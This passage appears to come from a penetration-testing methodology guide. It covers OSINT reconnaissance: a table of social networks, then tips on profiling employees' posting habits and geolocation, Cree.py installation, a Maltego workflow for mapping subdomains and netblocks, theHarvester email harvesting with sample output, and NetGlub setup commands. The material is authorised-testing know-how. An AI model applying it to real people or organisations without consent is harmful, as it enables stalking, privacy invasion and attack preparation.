<td>Social Network, social media, consumer reviews</td>
</tr>
<tr class="row-odd"><td>Mubi (website)</td>
<td><a class="reference external" href="http://mubi.com/">http://mubi.com</a></td>
<td>Auteur cinema</td>
</tr>
<tr class="row-even"><td>Multiply</td>
<td><a class="reference external" href="http://multiply.com/">http://multiply.com</a></td>
<td>Real world relationships. Popular in primarily in Asia.</td>
</tr>
<tr class="row-odd"><td>Muxlim</td>
<td><a class="reference external" href="http://muxlim.com/">http://muxlim.com</a></td>
<td>Muslim portal site</td>
</tr>
<tr class="row-even"><td>MyAnimeList</td>
<td><a class="reference external" href="http://www.myanimelist.net/">http://www.myanimelist.net</a></td>
<td>Anime themed social community</td>
</tr>
<tr class="row-odd"><td>MyChurch</td>
<td><a class="reference external" href="http://www.mychurch.org/">http://www.mychurch.org</a></td>
<td>Christian Churches</td>
</tr>
<tr class="row-even"><td>MyHeritage</td>
<td><a class="reference external" href="http://www.myheritage.com/">http://www.myheritage.com</a></td>
<td>family-oriented social network service</td>
</tr>
<tr class="row-odd"><td>MyLife</td>
<td><a class="reference external" href="http://www.mylife.com/">http://www.mylife.com</a></td>
<td>Locating friends and family, keeping in touch (formerly Reunion.com)</td>
</tr>
<tr class="row-even"><td>My Opera</td>
<td><a class="reference external" href="http://my.opera.com/">http://my.opera.com</a></td>
<td>Blogging, mobile blogging, photo sharing, connecting with friends, Opera Link and Opera Unite. Global</td>
</tr>
<tr class="row-odd"><td>Myspace</td>
<td><a class="reference external" href="http://www.myspace.com/">http://www.myspace.com</a></td>
<td>General</td>
</tr>
<tr class="row-even"><td>myYearbook</td>
<td><a class="reference external" href="http://www.myyearbook.com/">http://www.myyearbook.com</a></td>
<td>General, Charity</td>
</tr>
<tr class="row-odd"><td>Nasza-klasa.pl</td>
<td><a class="reference external" href="http://www.nk.pl/">http://www.nk.pl</a></td>
<td>School, college and friends. Popular in Poland</td>
</tr>
<tr class="row-even"><td>Netlog</td>
<td><a class="reference external" href="http://www.netlog.com/">http://www.netlog.com</a></td>
<td>General. Popular in Europe, Turkey, the Arab World and Canada&#8217;s QuÈbec province. Formerly known as Facebox and Redbox.</td>
</tr>
<tr class="row-odd"><td>Nettby</td>
<td><a class="reference external" href="http://www.nettby.no/">http://www.nettby.no</a></td>
<td>Norwegian Community</td>
</tr>
<tr class="row-even"><td>Nexopia</td>
<td><a class="reference external" href="http://www.nexopia.com/">http://www.nexopia.com</a></td>
<td>Canada</td>
</tr>
<tr class="row-odd"><td>NGO Post</td>
<td><a class="reference external" href="http://www.ngopost.org/">http://www.ngopost.org</a></td>
<td>Non-Profit news sharing and networking, mainly in India</td>
</tr>
<tr class="row-even"><td>Ning</td>
<td><a class="reference external" href="http://www.ngopost.org/">http://www.ngopost.org</a></td>
<td>Users create their own social websites and social networks</td>
</tr>
<tr class="row-odd"><td>Odnoklassniki</td>
<td><a class="reference external" href="http://odnoklassniki.ru/">http://odnoklassniki.ru</a></td>
<td>Connect with old classmates. Popular in Russia and former Soviet republics</td>
</tr>
<tr class="row-even"><td>OneClimate</td>
<td><a class="reference external" href="http://www.oneclimate.net/">http://www.oneclimate.net</a></td>
<td>Not for Profit Social networking and Climate Change</td>
</tr>
<tr class="row-odd"><td>OneWorldTV</td>
<td><a class="reference external" href="http://tv.oneworld.net/">http://tv.oneworld.net</a></td>
<td>Not for Profit Video sharing and social networking aimed at people interested in social issues, development, environment, etc.</td>
</tr>
<tr class="row-even"><td>Open Diary</td>
<td><a class="reference external" href="http://www.opendiary.com/">http://www.opendiary.com</a></td>
<td>First online blogging community, founded in 1998</td>
</tr>
<tr class="row-odd"><td>Orkut</td>
<td><a class="reference external" href="http://orkut.com/">http://orkut.com</a></td>
<td>General. Owned by Google Inc. Popular in India and Brazil.</td>
</tr>
<tr class="row-even"><td>OUTeverywhere</td>
<td><a class="reference external" href="http://www.outeverywhere.com/">http://www.outeverywhere.com</a></td>
<td>Gay/LGBTQ Community</td>
</tr>
<tr class="row-odd"><td>Passportstamp</td>
<td><a class="reference external" href="http://www.passportstamp.com/">http://www.passportstamp.com</a></td>
<td>Travel</td>
</tr>
<tr class="row-even"><td>Partyflock</td>
<td><a class="reference external" href="http://partyflock.nl/">http://partyflock.nl</a></td>
<td>Dutch virtual community for people interested in house music and other electronic dance music. Since 2001, Partyflock has evolved into the biggest online community for the dance scene in the Netherlands</td>
</tr>
<tr class="row-odd"><td>Picasa</td>
<td><a class="reference external" href="http://picasa.google.com/">http://picasa.google.com</a></td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>PicFog</td>
<td><a class="reference external" href="http://picfog.com/">http://picfog.com</a></td>
<td>PicFog shows pictures from twitter <em>as</em> they&#8217;re posted</td>
</tr>
<tr class="row-odd"><td>Pingsta</td>
<td><a class="reference external" href="http://www.pingsta.com/">http://www.pingsta.com</a></td>
<td>Collaborative platform for the world&#8217;s Internetwork Experts</td>
</tr>
<tr class="row-even"><td>Plaxo</td>
<td><a class="reference external" href="http://www.plaxo.com/">http://www.plaxo.com</a></td>
<td>Aggregator</td>
</tr>
<tr class="row-odd"><td>Playahead</td>
<td><a class="reference external" href="http://www.playahead.se/">http://www.playahead.se</a></td>
<td>Swedish, Danish teenagers</td>
</tr>
<tr class="row-even"><td>Playlist.com</td>
<td><a class="reference external" href="http://www.playlist.com/">http://www.playlist.com</a></td>
<td>General, Music</td>
</tr>
<tr class="row-odd"><td>Plurk</td>
<td><a class="reference external" href="http://www.plurk.com/">http://www.plurk.com</a></td>
<td>Micro-blogging, RSS, updates. Very popular in Taiwan</td>
</tr>
<tr class="row-even"><td>Present.ly</td>
<td><a class="reference external" href="http://www.presently.com/">http://www.presently.com</a></td>
<td>Enterprise social networking and micro-blogging</td>
</tr>
<tr class="row-odd"><td>Qapacity</td>
<td><a class="reference external" href="http://www.qapacity.com/">http://www.qapacity.com</a></td>
<td>A a business-oriented social networking site and a business directory</td>
</tr>
<tr class="row-even"><td>Quechup</td>
<td><a class="reference external" href="http://quechup.com/">http://quechup.com</a></td>
<td>General, friendship, dating</td>
</tr>
<tr class="row-odd"><td>Qzone</td>
<td><a class="reference external" href="http://qzone.qq.com/">http://qzone.qq.com</a></td>
<td>General. In Simplified Chinese; caters for mainland China users</td>
</tr>
<tr class="row-even"><td>Raptr</td>
<td><a class="reference external" href="http://raptr.com/">http://raptr.com</a></td>
<td>Video games</td>
</tr>
<tr class="row-odd"><td>Ravelry</td>
<td><a class="reference external" href="http://www.ravelry.com/">http://www.ravelry.com</a></td>
<td>Knitting and crochet</td>
</tr>
<tr class="row-even"><td>Renren</td>
<td><a class="reference external" href="http://renren.com/">http://renren.com</a></td>
<td>Significant site in China.</td>
</tr>
<tr class="row-odd"><td>ResearchGate</td>
<td><a class="reference external" href="http://researchgate.net/">http://researchgate.net</a></td>
<td>Social network for scientific researchers</td>
</tr>
<tr class="row-even"><td>ReverbNation.com</td>
<td><a class="reference external" href="http://www.reverbnation.com/">http://www.reverbnation.com</a></td>
<td>Social network for musician and bands</td>
</tr>
<tr class="row-odd"><td>Ryze</td>
<td><a class="reference external" href="http://www.ryze.com/">http://www.ryze.com</a></td>
<td>Business</td>
</tr>
<tr class="row-even"><td>ScienceStage</td>
<td><a class="reference external" href="http://sciencestage.com/">http://sciencestage.com</a></td>
<td>Science-oriented multimedia platform and network for scientists</td>
</tr>
<tr class="row-odd"><td>Scispace.net</td>
<td><a class="reference external" href="http://scispace.net/">http://scispace.net</a></td>
<td>Collaborative network site for scientists</td>
</tr>
<tr class="row-even"><td>ShareTheMusic</td>
<td><a class="reference external" href="http://www.sharethemusic.com/">http://www.sharethemusic.com</a></td>
<td>Music Community. Sharing and listening to music for free and legally</td>
</tr>
<tr class="row-odd"><td>Shelfari</td>
<td><a class="reference external" href="http://www.shelfari.com/">http://www.shelfari.com</a></td>
<td>Books</td>
</tr>
<tr class="row-even"><td>Skyrock</td>
<td><a class="reference external" href="http://skyrock.com/">http://skyrock.com</a></td>
<td>Social Network in French-speaking world</td>
</tr>
<tr class="row-odd"><td>Social Life</td>
<td><a class="reference external" href="http://www.sociallife.com.br/">http://www.sociallife.com.br</a></td>
<td>Brazilian jet set and social elite world-wide</td>
</tr>
<tr class="row-even"><td>SocialVibe</td>
<td><a class="reference external" href="http://www.socialvibe.com/">http://www.socialvibe.com</a></td>
<td>Social Network for Charity</td>
</tr>
<tr class="row-odd"><td>Sonico.com</td>
<td><a class="reference external" href="http://www.sonico.com/">http://www.sonico.com</a></td>
<td>General. Popular in Latin America and Spanish and Portuguese speaking regions.</td>
</tr>
<tr class="row-even"><td>Stickam</td>
<td><a class="reference external" href="http://www.stickam.com/">http://www.stickam.com</a></td>
<td>Live video streaming and chat.</td>
</tr>
<tr class="row-odd"><td>StudiVZ</td>
<td><a class="reference external" href="http://www.studivz.net/">http://www.studivz.net</a></td>
<td>University students, mostly in the German-speaking countries. School students and those out of education sign up via its partner sites sch¸lerVZ and meinVZ.</td>
</tr>
<tr class="row-even"><td>StumbleUpon</td>
<td><a class="reference external" href="http://www.stumbleupon.com/">http://www.stumbleupon.com</a></td>
<td>Stumble through websites that match your selected interests</td>
</tr>
<tr class="row-odd"><td>Tagged</td>
<td><a class="reference external" href="http://www.tagged.com/">http://www.tagged.com</a></td>
<td>General. Subject to quite some controversy about its e-mail marketing and privacy policy</td>
</tr>
<tr class="row-even"><td>Talkbiznow</td>
<td><a class="reference external" href="http://www.talkbiznow.com/">http://www.talkbiznow.com</a></td>
<td>Business networking</td>
</tr>
<tr class="row-odd"><td>Taltopia</td>
<td><a class="reference external" href="http://www.taltopia.com/">http://www.taltopia.com</a></td>
<td>Online artistic community</td>
</tr>
<tr class="row-even"><td>Taringa!</td>
<td><a class="reference external" href="http://www.taringa.net/">http://www.taringa.net</a></td>
<td>General</td>
</tr>
<tr class="row-odd"><td>TeachStreet</td>
<td><a class="reference external" href="http://www.teachstreet.com/">http://www.teachstreet.com</a></td>
<td>Education / Learning / Teaching - More than 400 subjects</td>
</tr>
<tr class="row-even"><td>TravBuddy.com</td>
<td><a class="reference external" href="http://www.travbuddy.com/">http://www.travbuddy.com</a></td>
<td>Travel</td>
</tr>
<tr class="row-odd"><td>Travellerspoint</td>
<td><a class="reference external" href="http://www.travellerspoint.com/">http://www.travellerspoint.com</a></td>
<td>Travel</td>
</tr>
<tr class="row-even"><td>tribe.net</td>
<td><a class="reference external" href="http://www.tribe.net/">http://www.tribe.net</a></td>
<td>General</td>
</tr>
<tr class="row-odd"><td>Trombi.com</td>
<td><a class="reference external" href="http://www.trombi.com/">http://www.trombi.com</a></td>
<td>French subsidiary of Classmates.com</td>
</tr>
<tr class="row-even"><td>Tuenti</td>
<td><a class="reference external" href="http://www.tuenti.com/">http://www.tuenti.com</a></td>
<td>Spanish-based university and High School social network. Very Popular in Spain</td>
</tr>
<tr class="row-odd"><td>Tumblr</td>
<td><a class="reference external" href="http://www.tumblr.com/">http://www.tumblr.com</a></td>
<td>General. Micro-blogging, RSS</td>
</tr>
<tr class="row-even"><td>Twitter</td>
<td><a class="reference external" href="http://twitter.com/">http://twitter.com</a></td>
<td>General. Micro-blogging, RSS, updates</td>
</tr>
<tr class="row-odd"><td>twitpic</td>
<td><a class="reference external" href="http://twitpic.com/">http://twitpic.com</a></td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>Vkontakte</td>
<td><a class="reference external" href="http://vkontakte.ru/">http://vkontakte.ru/</a></td>
<td>Social Network for Russian-speaking world including former Soviet republics. Biggest site in Russia</td>
</tr>
<tr class="row-odd"><td>Vampirefreaks.com</td>
<td><a class="reference external" href="http://www.vampirefreaks.com/">http://www.vampirefreaks.com</a></td>
<td>Gothic and industrial subculture</td>
</tr>
<tr class="row-even"><td>Viadeo</td>
<td><a class="reference external" href="http://www.viadeo.com/">http://www.viadeo.com</a></td>
<td>Global Social Networking and Campus Networking available in English, French, German, Spanish, Italian and Portuguese</td>
</tr>
<tr class="row-odd"><td>Virb</td>
<td><a class="reference external" href="http://www.virb.com/">http://www.virb.com</a></td>
<td>Social network that focuses heavily on artists, including musicians and photographers</td>
</tr>
<tr class="row-even"><td>Vox</td>
<td><a class="reference external" href="http://www.vox.com/">http://www.vox.com</a></td>
<td>Blogging</td>
</tr>
<tr class="row-odd"><td>Wakoopa</td>
<td><a class="reference external" href="http://social.wakoopa.com/">http://social.wakoopa.com</a></td>
<td>For computer fans that want to discover new software and games</td>
</tr>
<tr class="row-even"><td>Wattpad</td>
<td><a class="reference external" href="http://www.wattpad.com/">http://www.wattpad.com</a></td>
<td>For readers and authors to interact &amp; e-book sharing</td>
</tr>
<tr class="row-odd"><td>Wasabi</td>
<td><a class="reference external" href="http://www.wasabi.com/">http://www.wasabi.com</a></td>
<td>General. UK-based.</td>
</tr>
<tr class="row-even"><td>WAYN</td>
<td><a class="reference external" href="http://www.wayn.com/">http://www.wayn.com</a></td>
<td>Travel and lifestyle</td>
</tr>
<tr class="row-odd"><td>WebBiographies</td>
<td><a class="reference external" href="http://www.webbiographies.com/">http://www.webbiographies.com</a></td>
<td>Genealogy and biography</td>
</tr>
<tr class="row-even"><td>WeeWorld</td>
<td><a class="reference external" href="http://www.weeworld.com/">http://www.weeworld.com</a></td>
<td>Teenagers - 10 to 17</td>
</tr>
<tr class="row-odd"><td>WeOurFamily</td>
<td><a class="reference external" href="http://www.weourfamily.com/">http://www.weourfamily.com</a></td>
<td>General with emphasis on privacy and security</td>
</tr>
<tr class="row-even"><td>Wer-kennt-wen</td>
<td><a class="reference external" href="http://www.wer-kennt-wen.de/">http://www.wer-kennt-wen.de</a></td>
<td>General</td>
</tr>
<tr class="row-odd"><td>weRead</td>
<td><a class="reference external" href="http://weread.com/">http://weread.com</a></td>
<td>Books</td>
</tr>
<tr class="row-even"><td>Windows Live Spaces</td>
<td><a class="reference external" href="http://spaces.live.com/">http://spaces.live.com</a></td>
<td>Blogging (formerly MSN Spaces)</td>
</tr>
<tr class="row-odd"><td>WiserEarth</td>
<td><a class="reference external" href="http://www.wiserearth.org/">http://www.wiserearth.org</a></td>
<td>Online community space for the social justice and environmental movement</td>
</tr>
<tr class="row-even"><td>Wordpress</td>
<td><a class="reference external" href="http://wordpress.org/">http://wordpress.org</a></td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td>WorldFriends</td>
<td><a class="reference external" href="http://www.worldfriends.tv/">http://www.worldfriends.tv</a></td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>Xanga</td>
<td><a class="reference external" href="http://www.xanga.com/">http://www.xanga.com</a></td>
<td>Blogs and &#8220;metro&#8221; areas</td>
</tr>
<tr class="row-odd"><td>XING</td>
<td><a class="reference external" href="http://www.xing.com/">http://www.xing.com</a></td>
<td>Business (primarily Europe (Germany, Austria, Switzerland) and China)</td>
</tr>
<tr class="row-even"><td>Xt3</td>
<td><a class="reference external" href="http://www.xt3.com/">http://www.xt3.com</a></td>
<td>Catholic social networking, created after World Youth Day 2008</td>
</tr>
<tr class="row-odd"><td>Yammer</td>
<td><a class="reference external" href="http://www.yammer.com/">http://www.yammer.com</a></td>
<td>Social networking for office colleagues</td>
</tr>
<tr class="row-even"><td>Yelp, Inc.</td>
<td><a class="reference external" href="http://www.yelp.com/">http://www.yelp.com</a></td>
<td>Local Business Review and Talk</td>
</tr>
<tr class="row-odd"><td>Yfrog</td>
<td><a class="reference external" href="http://yfrog.com/">http://yfrog.com</a></td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>Youmeo</td>
<td><a class="reference external" href="http://youmeo.com/">http://youmeo.com</a></td>
<td>UK Social Network (focus on data portability)</td>
</tr>
<tr class="row-odd"><td>Zoo.gr</td>
<td><a class="reference external" href="http://www.zoo.gr/">http://www.zoo.gr</a></td>
<td>Greek Web Meeting point</td>
</tr>
<tr class="row-even"><td>Zooppa</td>
<td><a class="reference external" href="http://zooppa.com/">http://zooppa.com</a></td>
<td>Online Community for Creative Talent (host of brand sponsored advertising contests)</td>
</tr>
</tbody>
</table>
<p><strong>Tone and Frequency</strong></p>
<p>Identifying an employee&#8217;s tone and frequency of postings can be a
critical indicator of a disgruntled employee as well as the corporate
acceptance of social networking. While time consuming it is possible to
establish an employee&#8217;s work schedule and vacation periods.</p>
<p><strong>Location awareness</strong></p>
<p>Most social networking sites offer the ability to include geolocation
information in postings. This information can be useful in identifying
exactly where the person was physically located when a posting was made.
In addition, it is possible that geolocation information is included in
images that are uploaded to social networking sites. It is possible that
the user may be savy enough to turn this off, however, sometimes it&#8217;s
just as simple as reading a post that indicates exactly where they&#8217;re
located.</p>
<p>Cree.py is Beta tool that is used to automate the task of information
gathering from Twitter as well as FourSquare. In addition, Cree.py can
gather any geolocation data from flickr, twitpic.com, yfrog.com, img.ly,
plixi.com, twitrpix.com, foleext.com, shozu.com, pickhur.com, moby.to,
twitsnaps.com and twitgoo.com. Cree.py is an open source intelligence
gathering application. To install Cree.py, you will need to add a
repository to your /etc/apt/sources.list.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;deb http://people.dsv.su.se/~kakavas/creepy/ binary/&quot;</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apt</span><span class="o">/</span><span class="n">sources</span><span class="o">.</span><span class="n">list</span>
</pre></div>
</div>
<p>Update package list</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">update</span>
</pre></div>
</div>
<p>Install creepy</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="n">creepy</span>
</pre></div>
</div>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_03.png">Cree.py Interface</a></p>
<div class="line-block">
<div class="line">Cree.py is primarily targeting geolocation related information about
users from social networking platforms and image hosting services. The
information is presented in a map inside the application where all the
retrieved data is shown accompanied with relevant information (i.e.
what was posted from that specific location) to provide context to the
presentation.</div>
<div class="line-block">
<div class="line"><a class="reference external" href=":File:Penetration_Testing_Execution_04.png">Cree.py Interface</a></div>
</div>
</div>
</div>
<div class="section" id="internet-footprint">
<h3>Internet Footprint<a class="headerlink" href="#internet-footprint" title="Permalink to this headline">¶</a></h3>
<p>Internet Footprinting is where we attempt to gather externally available
information about the target infrastructure that we can leveraged in
later phases.</p>
<div class="section" id="email-addresses">
<h4>Email addresses<a class="headerlink" href="#email-addresses" title="Permalink to this headline">¶</a></h4>
<p>Gathering email addresses while seemingly useless can provide us with
valuable information about the target environment. It can provide
information about potential naming conventions as well as potential
targets for later use. There are many tools that can be used to gather
email addresses, Maltego for example.</p>
<div class="section" id="maltego">
<h5>Maltego<a class="headerlink" href="#maltego" title="Permalink to this headline">¶</a></h5>
<p>Paterva <a class="reference external" href="http://www.paterva.com/">Maltego</a> is used to automate the
task of information gathering.&nbsp; Maltego is an open source intelligence
and forensics application.&nbsp; Essentially, Maltego is a data mining and
information-gathering tool that maps the information gathered into a
format that is easily understood and manipulated.&nbsp; It saves you time by
automating tasks such as email harvesting and mapping subdomains. &nbsp;The
documentation of Maltego is relatively sparse so we are including the
procedures necessary to obtain the data required.</p>
<p>Once you have started Maltego, the main interface should be visible.
The six main areas of the interface are the toolbar, the Palette,
graph(view) area, overview area, the detailed area, and the property
area.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_05.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<div class="line-block">
<div class="line">Here is a suggested&nbsp; workflow to get you started, consider it a
training exercise rather than absolute since you will want to
customize your workflow depending on your engagement.</div>
<div class="line-block">
<div class="line">To start, look to the very upper left-hand corner of Maltego and
click the &#8220;new graph&#8221; button.&nbsp; After that, drag the &#8220;domain&#8221; item out
of the palette onto the graph.&nbsp; The graph area allows you to process
the transforms as well as view the data in either the mining view,
dynamic view, edge weighted view as well as the entity list.&nbsp; When you
first add the domain icon to your graph, it will default to
&#8220;paterva.com&#8221; double-click on that icon and change the name to your
target&#8217;s domain(without any subdomain such as www).&nbsp; Now you are ready
to start mining.</div>
<div class="line">1. Right click(or double-click) on the domain icon and from &#8220;run
transform&#8221; select the &#8220;To Website DNS[using search engine]&#8221;.&nbsp; This
will hopefully result in all of the subdomains for your target showing
up.</div>
</div>
<div class="line">2. Select all of the subdomains and run the &#8220;To IP Address [DNS]
transform&#8221;.&nbsp; This should resolve all of the subdomains to their
respective IP Addresses.</div>
<div class="line">&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_07.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</div>
<div class="line">3. From this point you could chose a couple different paths depending
on the size of your target but a logical next step is to determine the
netblocks so run the &#8220;To Netblock [Using natural boundaries]&#8221;
transform.</div>
<div class="line-block">
<div class="line">After this point, you should be able to use your imagination as to
where to go next.&nbsp; You will be able to cultivate phone numbers, email
addresses, geo location information and much more by using the
transforms provided.&nbsp; The Palette contains all the transforms that are
available (or activated) for use.&nbsp; As of this writing, there are
approximately 72 transforms.&nbsp; One limitation of the &#8220;Community
Edition&#8221; of Maltego is that any given transform will only return 12
results whereas the professional version doesn&#8217;t have any limitations.</div>
<div class="line">Resist the temptation to run &#8220;all transforms&#8221; since this will likely
overload you with data and inhibit your ability to drill down to the
most interesting pieces of data that are relevant to your engagement.</div>
</div>
</div>
<p>Maltego is not just limited to the pre-engagement portion of your
pentest.&nbsp; You can also import csv/xls dumps of your airodump results
back into Maltego to help you visualize the networks.</p>
</div>
<div class="section" id="theharvester">
<h5>TheHarvester<a class="headerlink" href="#theharvester" title="Permalink to this headline">¶</a></h5>
<p>TheHarvester is a tool, written by Christian Martorella, that can be
used to gather e-mail accounts and subdomain names from different public
sources (search engines, pgp key servers). Is a really simple tool, but
very effective.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@pentest</span><span class="p">:</span><span class="o">/</span><span class="n">pentest</span><span class="o">/</span><span class="n">enumeration</span><span class="o">/</span><span class="n">theharvester</span><span class="c1"># ./theHarvester.py</span>

<span class="o">*************************************</span>
<span class="o">*</span><span class="n">TheHarvester</span> <span class="n">Ver</span><span class="o">.</span> <span class="mf">1.6</span>             <span class="o">*</span>
<span class="o">*</span><span class="n">Coded</span> <span class="n">by</span> <span class="n">Christian</span> <span class="n">Martorella</span>      <span class="o">*</span>
<span class="o">*</span><span class="n">Edge</span><span class="o">-</span><span class="n">Security</span> <span class="n">Research</span>             <span class="o">*</span>
<span class="o">*</span><span class="n">cmartorella</span><span class="nd">@edge</span><span class="o">-</span><span class="n">security</span><span class="o">.</span><span class="n">com</span>      <span class="o">*</span>
<span class="o">*************************************</span>


<span class="n">Usage</span><span class="p">:</span> <span class="n">theharvester</span> <span class="n">options</span>

       <span class="o">-</span><span class="n">d</span><span class="p">:</span> <span class="n">domain</span> <span class="n">to</span> <span class="n">search</span> <span class="ow">or</span> <span class="n">company</span> <span class="n">name</span>
       <span class="o">-</span><span class="n">b</span><span class="p">:</span> <span class="n">data</span> <span class="n">source</span> <span class="p">(</span><span class="n">google</span><span class="p">,</span><span class="n">bing</span><span class="p">,</span><span class="n">pgp</span><span class="p">,</span><span class="n">linkedin</span><span class="p">)</span>
       <span class="o">-</span><span class="n">s</span><span class="p">:</span> <span class="n">start</span> <span class="ow">in</span> <span class="n">result</span> <span class="n">number</span> <span class="n">X</span> <span class="p">(</span><span class="n">default</span> <span class="mi">0</span><span class="p">)</span>
       <span class="o">-</span><span class="n">v</span><span class="p">:</span> <span class="n">verify</span> <span class="n">host</span> <span class="n">name</span> <span class="n">via</span> <span class="n">dns</span> <span class="n">resolution</span>
       <span class="o">-</span><span class="n">l</span><span class="p">:</span> <span class="n">limit</span> <span class="n">the</span> <span class="n">number</span> <span class="n">of</span> <span class="n">results</span> <span class="n">to</span> <span class="n">work</span> <span class="k">with</span><span class="p">(</span><span class="n">bing</span> <span class="n">goes</span> <span class="kn">from</span> <span class="mi">50</span> <span class="n">to</span> <span class="mi">50</span> <span class="n">results</span><span class="p">,</span>
            <span class="n">google</span> <span class="mi">100</span> <span class="n">to</span> <span class="mi">100</span><span class="p">,</span> <span class="ow">and</span> <span class="n">pgp</span> <span class="n">does</span><span class="s1">&#39;nt use this option)</span>

<span class="n">Examples</span><span class="p">:</span><span class="o">./</span><span class="n">theharvester</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">d</span> <span class="n">microsoft</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">l</span> <span class="mi">500</span> <span class="o">-</span><span class="n">b</span> <span class="n">google</span>
         <span class="o">./</span><span class="n">theharvester</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">d</span> <span class="n">microsoft</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">b</span> <span class="n">pgp</span>
         <span class="o">./</span><span class="n">theharvester</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">d</span> <span class="n">microsoft</span> <span class="o">-</span><span class="n">l</span> <span class="mi">200</span> <span class="o">-</span><span class="n">b</span> <span class="n">linkedin</span>
</pre></div>
</div>
<p>TheHarvester will search the specified data source and return the
results. This should be added to the OSINT document for use at a later
stage.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@pentest</span><span class="p">:</span><span class="o">/</span><span class="n">pentest</span><span class="o">/</span><span class="n">enumeration</span><span class="o">/</span><span class="n">theharvester</span><span class="c1"># ./theHarvester.py -d client.com -b google -l 500</span>

<span class="o">*************************************</span>
<span class="o">*</span><span class="n">TheHarvester</span> <span class="n">Ver</span><span class="o">.</span> <span class="mf">1.6</span>             <span class="o">*</span>
<span class="o">*</span><span class="n">Coded</span> <span class="n">by</span> <span class="n">Christian</span> <span class="n">Martorella</span>      <span class="o">*</span>
<span class="o">*</span><span class="n">Edge</span><span class="o">-</span><span class="n">Security</span> <span class="n">Research</span>             <span class="o">*</span>
<span class="o">*</span><span class="n">cmartorella</span><span class="nd">@edge</span><span class="o">-</span><span class="n">security</span><span class="o">.</span><span class="n">com</span>      <span class="o">*</span>
<span class="o">*************************************</span>

<span class="n">Searching</span> <span class="k">for</span> <span class="n">client</span><span class="o">.</span><span class="n">com</span> <span class="ow">in</span> <span class="n">google</span> <span class="p">:</span>

<span class="o">======================================</span>


<span class="n">Limit</span><span class="p">:</span> <span class="mi">500</span>
<span class="n">Searching</span> <span class="n">results</span><span class="p">:</span> <span class="mi">0</span>
<span class="n">Searching</span> <span class="n">results</span><span class="p">:</span> <span class="mi">100</span>
<span class="n">Searching</span> <span class="n">results</span><span class="p">:</span> <span class="mi">200</span>
<span class="n">Searching</span> <span class="n">results</span><span class="p">:</span> <span class="mi">300</span>
<span class="n">Searching</span> <span class="n">results</span><span class="p">:</span> <span class="mi">400</span>

<span class="n">Accounts</span> <span class="n">found</span><span class="p">:</span>
<span class="o">====================</span>
<span class="n">admin</span><span class="nd">@client</span><span class="o">.</span><span class="n">com</span>
<span class="n">nick</span><span class="nd">@client</span><span class="o">.</span><span class="n">com</span>
<span class="n">jane</span><span class="nd">@client</span><span class="o">.</span><span class="n">com</span>
<span class="n">sarah</span><span class="nd">@client</span><span class="o">.</span><span class="n">com</span>
</pre></div>
</div>
</div>
<div class="section" id="netglub">
<h5>NetGlub<a class="headerlink" href="#netglub" title="Permalink to this headline">¶</a></h5>
<p>NetGlub is an open source tool that is very similar to Maltego. NetGlub
is a data mining and information-gathering tool that presents the
information gathered in a format that is easily understood. The
documentation of NetGlub is nonexistent at the moment so we are
including the procedures necessary to obtain the data required.</p>
<p>Installing NetGlub is not a trivial task, but one that can be
accomplished by running the following:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="n">build</span><span class="o">-</span><span class="n">essential</span> <span class="n">mysql</span><span class="o">-</span><span class="n">server</span> <span class="n">libmysqlclient</span><span class="o">-</span><span class="n">dev</span> <span class="n">zlib1g</span><span class="o">-</span><span class="n">dev</span> <span class="n">libperl</span><span class="o">-</span><span class="n">dev</span> <span class="n">libnet</span><span class="o">-</span><span class="n">ip</span><span class="o">-</span><span class="n">perl</span> <span class="n">libopenssl</span><span class="o">-</span><span class="n">ruby</span> <span class="n">ruby</span><span class="o">-</span><span class="n">dev</span> <span class="n">ruby</span> <span class="n">omt</span> <span class="n">php5</span><span class="o">-</span><span class="n">cli</span> <span class="n">nmap</span> <span class="n">libnet</span><span class="o">-</span><span class="n">dns</span><span class="o">-</span><span class="n">perl</span> <span class="n">libnet</span><span class="o">-</span><span class="n">ip</span><span class="o">-</span><span class="n">perl</span> <span class="n">python</span><span class="o">-</span><span class="n">dev</span>
<span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pypi</span><span class="o">.</span><span class="n">python</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">packages</span><span class="o">/</span><span class="n">source</span><span class="o">/</span><span class="n">s</span><span class="o">/</span><span class="n">simplejson</span><span class="o">/</span><span class="n">simplejson</span><span class="o">-</span><span class="mf">2.1</span><span class="o">.</span><span class="mf">5.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
<span class="n">tar</span> <span class="o">-</span><span class="n">xzvf</span> <span class="n">simplejson</span><span class="o">-</span><span class="mf">2.1</span><span class="o">.</span><span class="mf">5.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
<span class="n">cd</span> <span class="n">simplejson</span><span class="o">-</span><span class="mf">2.1</span><span class="o">.</span><span class="mi">5</span>
